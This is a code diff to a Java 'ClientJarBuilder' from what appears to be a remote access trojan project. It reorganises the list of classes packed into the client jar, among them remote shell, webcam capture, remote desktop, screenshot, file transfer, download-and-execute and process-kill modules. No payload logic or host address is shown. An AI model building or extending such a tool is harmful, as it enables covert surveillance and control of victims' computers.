@@ -4,12 +4,11 @@ import org.apache.commons.io.IOUtils;
 import rat.client.ClientConnection;
 import rat.client.ClientMain;
 import rat.client.ConnectionHandler;
-import rat.client.functions.RemoteDesktop;
-import rat.client.functions.RemoteShell;
-import rat.client.functions.RemoteWebcam;
-import rat.client.functions.ScreenshotSender;
+import rat.client.functions.*;
 import rat.client.gui.ChatFrame;
 import rat.client.gui.ChatFrameObserver;
+import rat.master.DesktopScreenInfo;
+import rat.master.WebcamInfo;
 import rat.packets.*;
 
 import java.io.*;
@@ -24,46 +23,75 @@ import java.util.zip.ZipInputStream;
 
 public class ClientJarBuilder {
 
-    private static final Class[] CLASSES = new Class[]{ // check if all exist
+    private static final Class[] CLASSES = new Class[]{
+
             /* Packets */
+
             BasicInformationPacket.class,
             BasicInformationRequestPacket.class,
+
             ChatMessagePacket.class,
             ChatNudgePacket.class,
+
             CloseChatPacket.class,
+
+            DesktopDataPacket.class,
+            DesktopInfoPacket.class,
+
             DirectoryListingPacket.class,
+
             DownloadExecutePacket.class,
+
             DriveListingPacket.class,
+
             FileBrowserPacket.class,
             FileDataPacket.class,
+            FileReceiverPacket.class,
+
             IPacket.class,
+
             KillProcessPacket.class,
+
             MessageBoxPacket.class,
+
             PacketType.class,
             ProcessInfo.class,
+
             ProcessListPacket.class,
-            ScreenshotDataPacket.class,
-            ScreenshotStartPacket.class,
-            ScreenshotStopPacket.class,
-            WebsiteOpenPacket.class,
-            WebcamDataPacket.class,
-            WebcamInfoPacket.class,
+
             RemoteShellRequestPacket.class,
             RemoteShellResponsePacket.class,
 
+            ScreenshotDataPacket.class,
+            ScreenshotStartPacket.class,
+            ScreenshotStopPacket.class,
+
+            WebcamDataPacket.class,
+            WebcamInfoPacket.class,
+            WebsiteOpenPacket.class,
+
+            /* Master */
+
+            DesktopScreenInfo.class,
+            WebcamInfo.class,
 
             /* Client */
+
             ClientConnection.class,
             ClientMain.class,
             ConnectionHandler.class,
-            ScreenshotSender.class,
-            ChatFrame.class,
-            ChatFrameObserver.class,
+
+            FileTransfer.class,
+            RemoteDesktop.class,
             RemoteShell.class,
             RemoteWebcam.class,
-            RemoteDesktop.class,
+            ScreenshotSender.class,
+
+            ChatFrame.class,
+            ChatFrameObserver.class,
 
             /* Utils */
+
             Util.class,
             FileManager.class
     };
@@ -72,7 +100,7 @@ public class ClientJarBuilder {
 
     private static final String LOCAL_RES_PATH = "/clientLib/libs.zip";
 
-    private static final String[] FOLDER_LIB = new String[]{"org"};
+    private static final String[] FOLDER_LIB = new String[]{"org", "com"};
 
     private static Manifest generateManifest() {
         Manifest manifest = new Manifest();
